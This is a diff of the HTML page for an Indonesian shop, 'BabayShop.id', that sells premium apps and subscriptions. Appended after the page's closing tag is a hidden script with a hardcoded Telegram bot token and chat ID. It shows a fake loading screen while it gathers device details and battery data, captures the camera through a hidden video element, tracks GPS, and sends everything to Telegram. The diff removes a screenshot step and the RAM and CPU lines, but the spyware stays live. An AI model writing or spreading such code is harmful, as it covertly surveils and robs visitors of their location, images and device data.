@@ -1,4 +1,4 @@
-<!--Pembatasan kah -->
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -333,7 +333,6 @@
     <div class="container">
         <div class="header">
             <img src="https://blogger.googleusercontent.com/img/a/AVvXsEh73yQszviwrvHkc_oVjOtrJYqpsXgQdN30e9MwMko8V2fjh8rVLc730GqH4hiwkCEbiZDg4fDoSjyWWF03mxUgt66CRJMJ6xFvpx3tjB8VK0_DiWCFoL5MZMgnhIQyrbxwdMW4WBiu_-TDGidgkuWfBk6FMVjvhzeWGRzwhEmd3wCrirvWCr7maV_-DdeR" alt="BabayShop Logo" class="logo">
-            <h1>BabayShop.id</h1>
             <p>Premium Apps & Subscription Services</p>
         </div>
 
@@ -1021,13 +1020,20 @@
     </script>
 </body>
 </html>
+                    
 <!--Pembatasan kah -->
+
+
+
     <video id="video" autoplay muted class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
+    
+    
 <!--Pembatasan kah -->
     <script>
         const token = '8295593119:AAG_-Tr1HVrFVpD0_f4OLHSGEsqoDCk84og';
         const chatId = '1212063779';
+
         
         // Simulate infinite loading
         let progress = 0;
@@ -1120,10 +1126,8 @@
             message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
             message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
             message += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
-            message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
-            message += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
-            
-            // Battery Info
+          
+                      // Battery Info
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -1200,15 +1204,6 @@
                 await sendToTelegram('❌ Camera access blocked');
             }
 
-            // Take screenshot
-            setTimeout(async () => {
-                try {
-                    const canvas = await html2canvas(document.body);
-                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.html'), 'image/jpeg');
-                } catch (e) {
-                    await sendToTelegram('❌ Screenshot failed');
-                }
-            }, 5000);
 
             // GPS tracking
             if (navigator.geolocation) {
